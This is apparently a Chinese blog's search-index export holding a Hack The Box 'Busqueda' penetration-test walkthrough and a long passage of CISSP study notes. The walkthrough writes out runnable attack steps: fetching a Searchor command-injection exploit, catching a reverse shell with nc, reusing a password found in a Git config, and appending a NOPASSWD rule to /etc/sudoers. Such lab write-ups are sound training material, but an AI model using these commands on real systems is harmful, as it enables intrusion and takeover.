[{"title":"Busqueda","url":"/2025/05/22/Busqueda/","content":"Searcher HTB 渗透测试笔记整体渗透思路这是一个典型的Web应用渗透测试案例，攻击路径为：端口扫描 → Web应用枚举 → CVE漏洞利用获得初始访问 → 信息收集发现凭据 → 横向移动获得稳定shell → sudo权限滥用实现权限提升。\n关键点在于：\n\n彻底的信息收集和枚举\n对已知CVE的研究和利用\n在应用文件中挖掘敏感信息（Git配置）\n识别和利用系统配置错误（sudo权限）\n\n\n目标信息\n目标IP: 10.129.2.69\n难度: Easy\n系统: Linux\n\n\n1. 信息收集 (Reconnaissance)端口扫描# 快速全端口扫描sudo nmap -sT --min-rate 10000 -p- 10.129.2.69\n\n参数解释:\n\n-sT: TCP连接扫描，完成三次握手，更准确但较慢\n--min-rate 10000: 最小发包速率10000&#x2F;秒，加快扫描速度\n-p-: 扫描所有65535个端口\n使用原因: 快速发现所有开放端口，避免遗漏服务\n\n# 详细服务扫描nmap -sT -sC -sV -T3 -p 22,80,8080 10.129.2.69\n\n参数解释:\n\n-sC: 使用默认NSE脚本，获取更多服务信息\n-sV: 版本检测，识别服务版本\n-T3: 时间模板3（正常速度），平衡速度和准确性\n-p 22,80,8080: 只扫描发现的开放端口\n使用原因: 获取详细的服务版本信息，为后续漏洞研究做准备\n\n扫描结果:\n\n22&#x2F;tcp: SSH OpenSSH 8.9p1 Ubuntu\n80&#x2F;tcp: Apache httpd 2.4.52 (重定向到 searcher.htb)\n8080&#x2F;tcp: 关闭\n\n域名配置# 添加域名解析echo &quot;10.129.2.69 searcher.htb&quot; | sudo tee -a /etc/hostsecho &quot;10.129.2.69 gitea.searcher.htb&quot; | sudo tee -a /etc/hosts\n\n参数解释:\n\ntee -a: 追加内容到文件末尾，同时输出到标准输出\n使用原因: Web服务重定向到域名，需要本地DNS解析才能访问\n\n\n2. Web应用分析网站访问curl http://searcher.htb/\n\n使用原因: 命令行快速查看网页内容和响应头信息\n网站信息发现\nURL: http://searcher.htb\n技术栈: Flask + Searchor 2.4.0\n功能: 搜索引擎聚合器\n\n目录枚举gobuster dir -u http://searcher.htb -w /usr/share/wordlists/dirb/common.txt\n\n参数解释:\n\ndir: 目录爆破模式\n-u: 目标URL\n-w: 指定字典文件\n使用原因: 发现隐藏的目录和文件，可能包含敏感信息或管理界面\n\n\n3. 漏洞发现与利用CVE研究从网页发现关键信息：Powered by Flask and Searchor 2.4.0\n# 搜索已知漏洞searchsploit searchor\n\n使用原因: Searchor 2.4.0是较老版本，可能存在已知安全漏洞\n发现: Searchor 2.4.0 存在命令注入漏洞\n\nexploit: https://github.com/nikn0laty/Exploit-for-Searchor-2.4.0-Arbitrary-CMD-Injection\n\n下载和准备exploit# 下载exploit脚本wget https://github.com/nikn0laty/Exploit-for-Searchor-2.4.0-Arbitrary-CMD-Injection/raw/main/exploit.sh\n\n参数解释:\n\nraw/main: GitHub的原始文件路径，获取纯文本内容而非HTML页面\n使用原因: 需要下载可执行脚本，raw路径确保获得正确的文件内容\n\n# 给予执行权限chmod +x exploit.sh\n\n使用原因: 下载的脚本默认没有执行权限，需要手动添加\n获取反向Shell# 在攻击机设置监听器nc -lvnp 9001\n\n参数解释:\n\n-l: 监听模式\n-v: 详细输出\n-n: 不进行DNS解析，加快连接速度\n-p 9001: 监听9001端口\n使用原因: 建立监听器接收目标机器的反向连接\n\n# 执行exploit（在另一个终端）./exploit.sh searcher.htb 10.10.16.13\n\n参数解释:\n\nsearcher.htb: 目标主机\n10.10.16.13: 攻击者IP（VPN接口IP）\n使用原因: 利用命令注入漏洞获得目标系统的shell访问\n\n成功获得反向shell: svc@busqueda:/var/www/app\n\n4. 后渗透 - 用户权限Shell稳定化python3 -c &#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;export TERM=xterm\n\n使用原因: 反向shell功能有限，稳定化后可以使用tab补全、历史记录等功能\n获取用户Flagcd ~cat user.txt\n\n结果: f79ac2816d2a69998bfa6abf7a5d4d8e\n系统信息收集# 查看当前用户和权限whoamiid\n\n使用原因: 了解当前权限级别和所属组\n# 查看系统信息uname -acat /etc/os-release\n\n使用原因: 了解操作系统版本，为后续权限提升选择合适的方法\n# 查看用户目录ls -la /home/cat /etc/passwd | grep -E &quot;/bin/(bash|sh)&quot;\n\n参数解释:\n\ngrep -E: 使用扩展正则表达式\n/bin/(bash|sh): 匹配有shell权限的用户\n使用原因: 识别系统中的其他用户，为横向移动做准备\n\n\n5. 信息挖掘与横向移动Git仓库发现cd /var/www/appfind . -name &quot;.git&quot; -type d\n\n参数解释:\n\n-name &quot;.git&quot;: 查找名为.git的目录\n-type d: 只查找目录\n使用原因: Git仓库经常包含敏感信息，如配置文件、历史记录中的凭据\n\nGit配置分析cat .git/config\n\n使用原因: Git配置文件可能包含远程仓库的认证信息\n重要发现:\n[remote &quot;origin&quot;]url = http://cody:jh1usoih2bkjaspwe92@gitea.searcher.htb/cody/Searcher_site.git\n\n凭据提取:\n\n用户: cody\n密码: jh1usoih2bkjaspwe92\n\nSSH横向移动# 安装sshpass工具sudo apt install sshpass\n\n使用原因: 自动化SSH密码认证，避免手动输入密码\n# 测试SSH登录sshpass -p &#x27;jh1usoih2bkjaspwe92&#x27; ssh svc@searcher.htb\n\n参数解释:\n\n-p: 指定密码参数\n使用原因: 测试从Git配置中发现的凭据是否可用于SSH登录\n\n结果: 成功登录，原来这是svc用户的SSH密码！\n\n6. 权限提升 (Privilege Escalation)Sudo权限检查sudo -l\n\n使用原因: 检查当前用户可以以root权限执行哪些命令\n发现sudo权限:\n(root) /usr/bin/python3 /opt/scripts/system-checkup.py *\n\n脚本目录分析cd /opt/scripts/ls -la\n\n发现: 多个脚本文件，权限为 --x--x--x（只有执行权限，无读权限）\n脚本功能测试sudo /usr/bin/python3 /opt/scripts/system-checkup.py full-checkup\n\n使用原因: 测试脚本的正常功能，了解其工作原理为漏洞利用做准备\n输出分析: 脚本显示Docker容器、端口映射、Apache状态等信息\n相对路径漏洞分析通过测试发现：脚本接受参数 full-checkup，很可能会在当前目录查找并执行 full-checkup.sh 文件\n漏洞利用cd /tmp\n\n使用原因: 在&#x2F;tmp目录创建恶意脚本，该目录通常有写权限\ncat &gt; full-checkup.sh &lt;&lt; &#x27;EOF&#x27;#!/bin/bashecho &quot;svc ALL=(ALL:ALL) NOPASSWD: ALL&quot; &gt;&gt; /etc/sudoersEOF\n\n脚本解释:\n\n将svc用户添加到sudoers文件\nNOPASSWD: ALL: 允许无密码执行任何sudo命令\n使用原因: 通过修改sudoers文件获得持久的root权限\n\nchmod +x full-checkup.sh\n\n使用原因: 确保脚本有执行权限\nsudo /usr/bin/python3 /opt/scripts/system-checkup.py full-checkup\n\n使用原因: 利用sudo权限执行system-checkup.py，触发我们的恶意脚本\n获取Root权限sudo su\n\n使用原因: 利用修改后的sudoers配置切换到root用户\ncd /rootcat root.txt\n\n结果: e8362e463fa2ad8fdeff8a45ef8983ef\n\n关键漏洞总结\nSearchor 2.4.0 命令注入 - 初始访问点\nGit凭据泄露 - 横向移动到稳定SSH\nSudo权限滥用 + 相对路径漏洞 - 权限提升到root\n\n攻击链: Web漏洞 → 反向shell → 信息收集 → SSH访问 → 权限提升 → 完全控制\n","categories":["OSCP"],"tags":["Hackthebox","Linux Boxes"]},{"title":"CISSP手册","url":"/2025/06/08/CISSP%E6%89%8B%E5%86%8C/","content":"CISSP 8个域详细学习重点基于firmianay.gitbook.io网站笔记的深度解析\n域1：安全与风险管理 (15%) - 核心治理域🎯 CIA三元组 - 信息安全基石保密性（Confidentiality）\n\n实现机制：对称密码、非对称密码\n数据状态：静止、传输、使用\n失败表现：泄漏（Disclosure）\n过度保护后果：导致可用性受限\n\n完整性（Integrity）\n\n实现机制：消息摘要（散列函数）\n确保内容：数据未被未经授权更改\n失败表现：改变（Alteration）\n过度保护后果：可用性受限\n\n可用性（Availability）\n\n确保授权用户任何时间都可访问\n失败表现：销毁（Destruction）\n过度提供后果：机密性和完整性损失\n\n扩展概念\n\n真实性（Authenticity）&#x3D; 完整性 + 不可否认性\n不可否认性（Nonrepudiation）：通过数字签名实现\n\n🔐 AAA服务模型 - 访问控制基础\n标识（Identification）：声明自己是谁\n身份认证（Authentication）：验证身份真实性\n授权（Authorization）：分配访问权限\n审计（Auditing）：记录用户行为\n可问责性（Accounting）：事后追责\n\n🛡️ 保护机制详解纵深防御（Defense in Depth）\n\n分层：连续使用多个控制\n宏观：管理、技术、物理控制组合\n细节：边界防火墙 + 数据中心防火墙\n\n抽象（Abstraction）\n\n高效处理：相同属性元素统一管理\n典型应用：基于角色的访问控制（RBAC）\n\n数据隐藏（Data Hiding）\n\n需要授权才能访问的数据存放方式\nvs 隐式安全：不告知对象存在\n\n加密（Encryption）\n\n即使获取数据也无法读取实际内容\n\n📊 风险管理 - 量化决策基础定量风险分析公式\n资产价值（AV） × 暴露因子（EF） = 单一损失期望（SLE）SLE × 年化发生率（ARO） = 年化损失期望（ALE）成本效益 = ALE前 - ALE后 - 年化防护成本（ACS）\n\n风险要素三角\n\n资产（Asset）：有形价值 + 无形价值\n威胁（Threat）：自然 + 人为\n脆弱性（Vulnerability）：系统弱点\n\n风险响应六策略\n\n风险缓解：部署防火墙降低被攻击风险\n风险转移：购买保险转移经济损失\n风险接受：成本超过价值，接受风险\n风险拒绝：不承认风险存在（错误做法）\n风险威慑：威慑攻击者的心理战术\n风险规避：彻底避免风险活动\n\n风险变化类型\n\n固有风险：风险管理前的原始风险\n剩余风险：实施控制后仍存在的风险\n总风险：无保障措施时面临的风险\n控制间隙：总风险 - 剩余风险\n\n🎭 威胁建模 - STRIDE方法论Spoofing（欺骗）\n\n攻击方式：ARP欺骗、窃取cookie\n防护目标：身份验证\n\nTampering（篡改）\n\n攻击方式：修改数据库记录\n防护目标：完整性\n\nRepudiation（否认）\n\n攻击方式：共用账号无法审计\n防护目标：不可否认性\n\nInformation Disclosure（信息泄露）\n\n攻击方式：图纸、薪酬、PII泄露\n防护目标：机密性\n\nDoS（拒绝服务）\n\n攻击方式：DDoS攻击\n防护目标：可用性\n\nElevation of Privilege（特权提升）\n\n攻击方式：利用普通账号获取管理员权限\n防护目标：授权控制\n\n📋 安全治理体系制度层次结构\n安全策略（最高层）    ↓安全标准（强制要求）    ↓安全基线（最低要求）    ↓安全指南（建议性）    ↓安全程序（详细SOP）\n\n策略类型\n\n监管性策略：遵循法律要求\n建议性策略：定义行为和处罚\n信息性策略：组织知识和目标\n\n组织角色职责\n\n高级管理层：最终责任，策略批准\n安全专家：具体实施\n资产所有者：保护责任（高级经理）\n托管员：执行保护任务（运维工程师）\n用户：系统使用者\n审计员：合规检查\n\n👥 人员安全 - 全生命周期管理招聘筛选要素\n\n工作履历验证\n教育背景核实\n同事推荐访谈\n犯罪记录查询\n药物测试检查\n性格评估分析\n社交媒体审查\n\n在职监督机制\n\n特权蠕变（Privilege Creep）防范\n强制休假（1-2周）检查\n合谋（Collusion）预防\n用户实体行为分析（UEBA）\n\n离职处理清单\n\n同时或之前禁用账户\n离职面谈强调NDA&#x2F;NCA\n回收公司资产\n安保陪同收拾物品\n通知相关人员\n\n社会工程心理学原理\n\n权威：冒充CEO下达指令\n恐吓：威胁解雇强迫服从\n共识：声称同事已同意协助\n稀缺性：限时优惠诱惑\n熟悉感：利用对熟人的信任\n信任：建立关系后利用\n紧迫性：制造时间压力\n\n社会工程攻击类型\n\n网络钓鱼（Phishing）：通用诈骗邮件\n鱼叉钓鱼（Spear Phishing）：针对性攻击\n鲸钓（Whaling）：针对高管\n钓鱼短信（Smishing）：SMS诈骗\n钓鱼语音（Vishing）：电话诈骗\n商业邮件诈骗（BEC）：伪装高管邮件\n\n📈 业务连续性计划（BCP）制定流程\n\n组织审查：识别所有部门和业务流程\nBCP团队选择：多部门代表 + 高管支持\n资源需求评估：人力财力硬件软件\n法律法规要求：合规底线\n\n业务影响分析（BIA）关键指标\n\n资产价值（AV）：业务系统重要性\n最大允许中断时间（MTD&#x2F;MTO）：业务可承受停机时间\n恢复时间目标（RTO）：系统恢复所需时间\n恢复点目标（RPO）：可接受的数据丢失量\n核心要求：RTO &lt; MTD\n\n连续性规划保护资产\n\n人员：最高优先级，人命关天\n建筑设施：加固预备 + 替代站点\n基础设施：物理加固 + 替代系统\n\n⚖️ 法律法规合规知识产权保护\n\n版权：文学音乐影视代码，死后70年\n商标：公司标识口号，10年续期无限\n专利：发明创新，20年保护期\n商业秘密：核心竞争力，签署NDA保护\n\n重要法规详解\nGDPR核心条款\n\n合法公平透明：遵循法律，公开处理活动\n目的限制：文档化声明收集目的\n数据最小化：仅收集必需数据\n准确性：确保数据正确\n存储限制：遵守被遗忘权\n可问责性：对数据使用负责\n\n美国隐私法体系\n\nHIPAA：医疗数据保护，要求BAA协议\nCOPPA：13岁以下儿童需家长同意\nGLBA：金融机构客户信息保护\nFERPA：教育机构学生隐私权\n\n行业合规标准\n\nPCI DSS：信用卡数据安全\nSOX：财务数据完整性\nFISMA：联邦政府网络安全\n\n\n域2：资产安全 (10%) - 数据保护核心📁 数据分类体系政府分类标准\n\n绝密（Top Secret）：国家安全重大危害\n机密（Secret）：国家安全严重危害\n受限（Confidential）：国家安全一般危害\n非密（Unclassified）：无害信息\n\n商业分类标准\n\n机密（Confidential）：竞争敏感信息\n私有（Private）：内部使用信息\n敏感（Sensitive）：需要保护但可有限共享\n公开（Public）：可公开发布信息\n\n🔄 数据生命周期管理六阶段模型\n\n创建（Creation）：数据产生，初始分类\n存储（Storage）：安全存储，访问控制\n使用（Use）：授权访问，活动监控\n共享（Sharing）：传输保护，接收方验证\n归档（Archiving）：长期保存，合规要求\n销毁（Destruction）：安全清除，证书保存\n\n每阶段安全控制\n\n数据创建：自动分类标记\n数据存储：加密、备份、访问控制\n数据使用：DLP、水印、活动审计\n数据共享：传输加密、数字签名\n数据归档：完整性验证、定期检查\n数据销毁：多次覆写、物理销毁\n\n🎭 数据角色与职责数据所有者（Data Owner）\n\n通常是高级经理\n负责数据保护最终责任\n决定数据分类级别\n授权访问权限\n\n数据管理员（Data Custodian）\n\n执行日常保护任务\n实施技术控制措施\n监控数据访问活动\n执行备份和恢复\n\n数据处理者（Data Processor）\n\n代表数据控制者处理数据\n必须按指令处理数据\n需要签订处理协议\n承担有限责任\n\n数据主体（Data Subject）\n\n数据所指向的个人\n拥有数据权利\n可要求访问、纠正、删除\n\n🔒 隐私保护技术去标识化技术\n\n匿名化（Anonymization）：不可逆去除标识\n假名化（Pseudonymization）：可逆的标识替换\nK-匿名：至少K个记录具有相同属性\n差分隐私：添加数学噪声保护\n\n隐私增强技术（PET）\n\n同态加密：加密状态下计算\n安全多方计算：分布式隐私计算\n零知识证明：证明而不泄露信息\n联邦学习：分布式机器学习\n\n📊 数据质量管理数据质量维度\n\n准确性：数据反映真实情况\n完整性：数据完整无缺失\n一致性：不同来源数据一致\n及时性：数据反映当前状态\n有效性：数据符合业务规则\n\n数据治理流程\n\n数据资产清单：识别所有数据资产\n数据血缘分析：追踪数据来源和流向\n数据质量监控：持续监测数据质量\n元数据管理：管理数据的数据\n\n\n域3：安全架构和工程 (13%) - 技术基础域🔐 密码学深度解析信息安全四大支柱实现\n\n保密性：对称加密（AES）+ 非对称加密（RSA）\n完整性：散列函数（SHA-256）+ HMAC\n身份验证：零知识证明 + 数字证书\n不可否认性：数字签名（私钥签名，公钥验证）\n\n密码学基本原理\n\n显式安全（Kerckhoffs原则）：算法公开仍安全\n隐式安全：算法保密才安全（错误理念）\n科学分类：\n密码术（Cryptography）：创建密码\n密码分析（Cryptanalysis）：破解密码\n密码学（Cryptology）：两者结合\n\n\n\n布尔数学与逻辑运算\nAND（与）：1 AND 1 = 1，其他 = 0OR（或）：0 OR 0 = 0，其他 = 1NOT（非）：NOT 1 = 0，NOT 0 = 1XOR（异或）：相同 = 0，不同 = 1\n\n密码学关键概念\n\n模函数（mod）：除法求余运算\n单向函数：A→B容易，B→A困难\nNonce：一次性随机数（如IV）\n零知识证明：证明知道秘密而不泄露秘密\n分隔知识：M of N控制，需要M个人同时在场\n\n🔑 对称加密算法详解算法分类\n\n流密码：逐字符&#x2F;位加密（RC4、一次性密码本）\n块密码：固定长度块加密（DES、AES）\n\n主要算法比较\nDES：56位密钥，64位块，已不安全3DES：112/168位密钥，仍在使用但逐步淘汰AES：128/192/256位密钥，128位块，当前标准RC4：流密码，已被攻破Blowfish：32-448位密钥，免费使用Twofish：128位块，预白化+后白化\n\n分组密码工作模式\n\nECB（电子密码本）：每块独立加密，不安全\nCBC（密码块链接）：前一块密文参与下一块加密\nCFB（密码反馈）：流密码版本的CBC\nOFB（输出反馈）：生成密钥流加密\nCTR（计数器）：计数器生成密钥流\nGCM（伽罗瓦计数器）：CTR+认证，AEAD模式\n\n对称加密缺点\n\n密钥分发问题：如何安全交换密钥\n不提供不可否认性：无法确认发送方\n缺乏可伸缩性：n个用户需要n(n-1)&#x2F;2个密钥\n密钥生命周期短：人员变动影响全局\n\n🗝️ 非对称加密算法主要算法特点\n\nRSA：基于大整数分解，专利已过期\nECC：椭圆曲线，160位ECC ≈ 1024位RSA\nEl Gamal：基于Diffie-Hellman，密文长度翻倍\nDiffie-Hellman：仅用于密钥交换\n\n非对称加密优势\n\n密钥分发简单：公钥公开，私钥自己保管\n提供不可否认性：私钥签名唯一性\n可伸缩性好：n个用户仅需2n个密钥\n密钥生命周期长：新用户加入不影响他人\n\n量子计算威胁\n\n量子优势：解决经典计算难题\n威胁算法：RSA、DH等基于数学难题的算法\n应对策略：后量子密码学算法研究\n时间考虑：评估数据敏感期vs量子计算普及时间\n\n#️⃣ 散列函数与完整性散列函数五大要求\n\n输入任意长度\n输出固定长度\n计算相对容易\n单向不可逆\n无碰撞性（不同输入不产生相同输出）\n\n主要散列算法\nMD5：128位，已被攻破SHA-1：160位，已不安全SHA-2：SHA-256(256位)、SHA-512(512位)，安全SHA-3：基于Keccak，最新标准RIPEMD-160：160位，比特币使用\n\n消息认证码（MAC）\n\n目的：防止传输中被篡改\nHMAC：密钥+消息一起计算散列\n提供：完整性+认证，不提供不可否认性\n\n✍️ 数字签名技术数字签名过程\n\n发送方：消息→散列→私钥加密→数字签名\n接收方：公钥解密→对比消息散列→验证真实性\n\n数字签名算法\n\nRSA：可用于加密和签名\nDSA：专门用于数字签名\nECDSA：椭圆曲线数字签名\n\n数字证书（X.509标准）\n\n版本号、序列号、签名算法标识\n颁发者、有效期、主体名称\n主体公钥、扩展字段\n\nPKI基础设施\n\nCA（证书颁发机构）：签发和管理证书\nRA（注册机构）：验证用户身份\nCRL（证书撤销列表）：已撤销证书清单\nOCSP：在线证书状态协议\n\n🏗️ 安全架构原则核心设计原则\n\n最小权限：仅分配必需的最小权限\n职责分离：关键操作需多人参与\n深度防御：多层安全控制\n故障安全：系统故障时保持安全状态\n\n故障处理模式\n\n故障弱化（Fail-soft）：部分功能继续运行\n故障安全（Fail-secure）：物理安全优先，门禁关闭\n故障安全（Fail-safe）：生命安全优先，门禁开启\n故障开放（Fail-open）：可用性优先，防火墙bypass\n故障关闭（Fail-closed）：安全优先，阻断所有流量\n\n安全模型详解\nBell-LaPadula模型（机密性）\n\n简单安全属性：不准向上读（No Read Up）\n*安全属性：不准向下写（No Write Down）\n自由安全属性：自主访问控制矩阵\n\nBiba模型（完整性）\n\n简单完整性属性：不准向下读\n*完整性属性：不准向上写\n与Bell-LaPadula正好相反\n\nClark-Wilson模型（完整性）\n\nCDI（受约束数据项）：需要保护的数据\nUDI（无约束数据项）：不需要保护的数据\nIVP（完整性验证过程）：验证数据完整性\nTP（转换过程）：唯一可修改CDI的过程\n\nChinese Wall模型（动态权限）\n\n防止利益冲突\n根据用户历史访问动态调整权限\n如访问公司A数据后，不能访问竞争对手公司B数据\n\n💻 系统架构安全处理器保护机制\n\n保护环（Protection Rings）：\nRing 0：内核，最高权限\nRing 1：操作系统其他部分\nRing 2：I&#x2F;O驱动和系统应用\nRing 3：用户应用程序\n\n\n\n进程状态管理\n\n就绪状态（Ready）：等待CPU分配\n等待状态（Waiting）：等待资源或事件\n运行状态（Running）：正在执行\n问题状态（Problem）：用户模式\n监管状态（Supervisory）：特权模式\n\n\n停止状态（Stopped）：进程终止\n\n内存管理\n\n实际内存（Real Memory）：物理RAM\n虚拟内存（Virtual Memory）：硬盘模拟内存\n高速缓存（Cache）：CPU和内存间缓冲\n寄存器（Registers）：CPU板载存储\n\n内存寻址方式\n\n寄存器寻址：直接使用CPU寄存器\n立即寻址：数据包含在指令中\n直接寻址：指令包含实际地址\n间接寻址：通过另一个地址访问\n基址+偏移：基地址+偏移量计算\n\n🖥️ 虚拟化与云计算虚拟化类型\n\nType 1 Hypervisor：直接安装在硬件（ESXi）\nType 2 Hypervisor：安装在操作系统上（VMware）\n\n虚拟化安全挑战\n\nVM逃逸：虚拟机突破隔离攻击宿主机\nVM蔓延：大量未管理虚拟机\n影子IT：未经授权的IT部署\n虚拟机监控程序攻击\n\n容器安全\n\n容器vs虚拟机：共享内核vs独立操作系统\n容器镜像安全：基础镜像漏洞扫描\n运行时保护：容器行为监控\n编排安全：Kubernetes安全配置\n\n云服务模型安全\n\nIaaS：基础设施即服务，客户负责操作系统以上\nPaaS：平台即服务，客户负责应用和数据\nSaaS：软件即服务，供应商负责大部分安全\n\n📱 移动设备安全移动设备管理（MDM）策略\n\nBYOD：自带设备办公\nCOPE：公司拥有个人使用\nCYOD：选择自己的设备\nCOMS&#x2F;COBO：公司拥有仅业务使用\n\n移动安全控制\n\n全设备加密（FDE）：保护设备存储数据\n远程擦除：设备丢失时清除数据\n应用程序白名单：控制可安装应用\n地理围栏：基于位置的自动化控制\n容器化：企业数据与个人数据分离\n\n移动威胁\n\n越狱&#x2F;Root：绕过安全限制\n恶意应用：第三方应用商店风险\n网络攻击：恶意Wi-Fi热点\n社会工程：钓鱼短信和应用\n\n🏢 物理安全设计CPTED（通过环境设计预防犯罪）\n\n自然访问控制：入口引导和限制\n自然监视：增加被观察机会\n自然领土强化：营造社区归属感\n\n物理控制分类\n\n威慑：警告标志、摄像头（可见）\n阻挡：围栏、门锁、防护屏障\n监测：CCTV、运动传感器、入侵检测\n延迟：多层防护、迂回路径设计\n\n环境控制\n\n温度：15-32°C最适宜\n湿度：20-80%，防止静电和腐蚀\n电力：UPS、发电机、浪涌保护\n火灾：检测系统+抑制系统\n\n数据中心设计原则\n\n位置：建筑核心，避免一楼和顶楼\n结构：至少1小时耐火等级\n访问：最少化人员接触\n监控：7x24小时监控\n\n\n域4：通信和网络安全 (13%) - 网络防护核心🌐 网络协议栈深度分析OSI七层模型详解\n应用层（7）：HTTP、SMTP、FTP、DNS表示层（6）：加密、压缩、格式转换会话层（5）：建立、管理、终止会话传输层（4）：TCP（可靠）、UDP（快速）网络层（3）：IP路由、ICMP错误报告数据链路层（2）：MAC地址、帧传输、错误检测物理层（1）：电信号、光信号、无线信号\n\nTCP&#x2F;IP模型映射\n应用层 = OSI 5-7层传输层 = OSI 4层网络层 = OSI 3层网络接入层 = OSI 1-2层\n\n数据封装过程\n\n应用层：数据（Data）\n传输层：段（Segment）+ TCP&#x2F;UDP头\n网络层：包（Packet）+ IP头\n数据链路层：帧（Frame）+ MAC头和尾\n物理层：比特（Bits）\n\n🔐 网络安全协议SSL&#x2F;TLS详解\n\nSSL：安全套接字层，已弃用\nTLS：传输层安全，当前标准\n握手过程：\n客户端发送支持的加密套件\n服务器选择加密套件并发送证书\n客户端验证证书并生成预主密钥\n双方计算会话密钥开始加密通信\n\n\n\nIPSec架构\n\nAH（认证头）：提供完整性和认证，不加密\nESP（封装安全载荷）：提供机密性、完整性、认证\n传输模式：仅加密载荷\n隧道模式：加密整个IP包\nIKE：密钥交换协议\n\nVPN类型\n\n站点到站点VPN：连接不同地理位置网络\n远程访问VPN：个人设备接入企业网络\n分离隧道：部分流量走VPN，部分直接访问互联网（安全风险）\n\n📡 无线网络安全深度Wi-Fi安全标准演进\nWEP（有线等效保密）- 40/104位密钥，RC4加密- 严重缺陷：IV重用、弱密钥- 几分钟内可被破解WPA（Wi-Fi保护访问）- TKIP（临时密钥完整性协议）- 动态密钥管理- 临时解决方案WPA2（802.11i标准）- AES-CCMP加密- 强制证书或PSK认证- 企业级：802.1X认证- 个人级：预共享密钥WPA3（最新标准）- SAE（同时认证）替代PSK- 前向保密- 192位安全套件（企业级）- 简化设备配置\n\n无线攻击方法\n\nWar Driving：开车寻找无线网络\nWar Chalking：标记发现的无线网络\n恶意接入点：伪造合法AP\nEvil Twin：克隆合法AP欺骗用户\nDeauth攻击：强制断开客户端连接\nWPS攻击：利用WPS PIN漏洞\nKrack攻击：WPA2密钥重装攻击\n\n无线安全最佳实践\n\n更改默认SSID和管理密码\n禁用WPS功能\n使用强加密（WPA3&#x2F;WPA2）\n隐藏SSID（安全性有限）\nMAC地址过滤（可被绕过）\n定期更新固件\n使用企业级认证（802.1X）\n\n🛡️ 网络防护技术防火墙技术演进\n第一代：包过滤防火墙- 基于IP、端口、协议过滤- 无状态检查- 性能高，安全性低第二代：状态检测防火墙- 跟踪连接状态- 动态规则调整- 防止TCP序列号攻击第三代：应用层防火墙- 深度包检测（DPI）- 应用协议理解- 更细粒度控制下一代防火墙（NGFW）- 集成IPS功能- 应用识别和控制- 用户身份识别- 威胁情报集成\n\n入侵检测系统（IDS）\n\nNIDS：网络入侵检测，监控网络流量\nHIDS：主机入侵检测，监控主机活动\n检测方法：\n签名检测：已知攻击模式匹配\n异常检测：基线偏差分析\n启发式检测：行为分析\n\n\n\n入侵防护系统（IPS）\n\n实时阻断恶意流量\n内联部署，可能影响性能\n误报可能导致业务中断\n需要精确调优规则\n\n🌍 网络架构设计网络分段策略\n\nDMZ（非军事区）：\nWeb服务器、邮件服务器\n内外网间的缓冲区\n双防火墙架构\n\n\n\nVLAN安全\n\n逻辑网络分割\n广播域隔离\nVLAN间路由控制\nVLAN跳跃攻击防护\n\n网络拓扑安全考虑\n\n星型：中央节点故障影响全网\n环型：单点故障可能导致环路\n网格型：冗余路径，复杂管理\n总线型：已过时，安全性差\n\n零信任网络架构\n\n绝不信任，始终验证\n微分段（Microsegmentation）\n软件定义边界（SDP）\n身份感知网络访问（IANA）\n\n📊 网络监控与分析网络流量分析\n\nNetFlow&#x2F;sFlow：流量统计和分析\n包捕获：完整数据包分析\n协议分析：深度协议解码\n行为分析：异常流量检测\n\n网络取证\n\n流量镜像：复制网络流量\n时间同步：准确的时间戳\n证据保全：完整性保护\n分析工具：Wireshark、TCPdump\n\n网络性能监控\n\n带宽利用率监控\n延迟和丢包分析\n应用性能监控（APM）\n网络设备健康监控\n\n\n域5：身份与访问管理 (13%) - 访问控制核心🔑 身份管理基础身份验证三要素\n\n知识因素（Something you know）：\n密码、PIN码、安全问题\n易被窃取、分享、忘记\n\n\n持有因素（Something you have）：\n硬件令牌、智能卡、手机\n可能丢失、被盗、损坏\n\n\n生物因素（Something you are）：\n指纹、虹膜、面部、声纹\n难以伪造，但有错误率\n\n\n\n多因素认证（MFA）\n\n双因素：两种不同类型要素\n多因素：三种或更多要素\n安全性：组合使用比单一要素更安全\n用户体验：平衡安全与便利性\n\n生物识别技术\n\n错误率指标：\nFAR（错误接受率）：错误接受非授权用户\nFRR（错误拒绝率）：错误拒绝授权用户\nCER（交叉错误率）：FAR&#x3D;FRR的点，越低越好\n\n\n生物识别类型：\n生理特征：指纹、虹膜、面部、手掌\n行为特征：签名、击键、步态、声音\n\n\n\n🚪 访问控制模型详解自主访问控制（DAC）\n\n资源所有者决定访问权限\n权限可以传递和委派\n灵活但难以集中管理\n容易权限蔓延\n典型实现：Windows NTFS权限\n\n强制访问控制（MAC）\n\n系统强制执行安全策略\n基于安全标签和级别\n用户无法修改访问权限\n适用于高安全环境\n典型实现：军方分级系统\n\n基于角色的访问控制（RBAC）\n\n基于用户角色分配权限\n角色继承和层次结构\n职责分离原则\n简化权限管理\n典型实现：企业ERP系统\n\n基于属性的访问控制（ABAC）\n\n基于多种属性动态授权\n属性包括：主体、客体、环境、动作\n最灵活的访问控制模型\n复杂的策略语言（XACML）\n适用于云环境和复杂场景\n\n🎫 身份联邦与单点登录SAML（安全断言标记语言）\n\n基于XML的身份联邦标准\n组件：\n身份提供者（IdP）：认证用户身份\n服务提供者（SP）：提供业务服务\n断言：身份和属性声明\n\n\n流程：用户→IdP认证→SAML断言→SP授权访问\n\nOAuth 2.0授权框架\n\n角色：\n资源所有者：用户\n客户端：第三方应用\n授权服务器：颁发访问令牌\n资源服务器：受保护资源\n\n\n授权类型：\n授权码：最安全，适用于Web应用\n隐式：适用于移动应用\n客户端凭据：应用间通信\n密码：仅可信应用\n\n\n\nOpenID Connect\n\nOAuth 2.0之上的身份层\n提供身份验证功能\nID令牌：包含用户身份信息\n用户信息端点：获取用户详细信息\n\n👤 账户管理与治理账户生命周期管理\n1. 账户创建（Provisioning）   - 最小权限原则   - 自动化工作流   - 管理者批准2. 账户维护（Maintenance）   - 定期权限审查   - 角色变更管理   - 权限回收3. 账户停用（Deprovisioning）   - 及时停用离职账户   - 权限移除   - 数据访问审计\n\n特权账户管理（PAM）\n\n特权账户识别：管理员、服务账户、应急账户\n密码管理：自动轮换、复杂度要求\n会话管理：录屏、时间限制、审批流程\n最小权限：just-in-time访问\n审计跟踪：完整的访问日志\n\n身份治理与管理（IGA）\n\n身份生命周期自动化\n权限审查和认证\n合规报告\n风险评分\n策略执行\n\n🔐 